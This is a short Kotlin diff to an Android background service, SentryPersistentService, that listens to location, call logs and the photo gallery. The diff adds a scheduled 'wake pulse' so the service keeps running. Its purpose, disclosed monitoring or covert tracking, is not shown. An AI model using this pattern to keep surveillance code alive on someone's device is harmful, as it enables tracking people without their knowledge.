@@ -38,6 +38,7 @@ class SentryPersistentService : Service() {
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
         BackgroundGalleryManager.startListening(applicationContext)
+        SentryWakeManager.scheduleWakePulse(applicationContext)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -49,6 +50,7 @@ class SentryPersistentService : Service() {
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
         BackgroundGalleryManager.startListening(applicationContext)
+        SentryWakeManager.scheduleWakePulse(applicationContext)
         return START_STICKY
     }
 
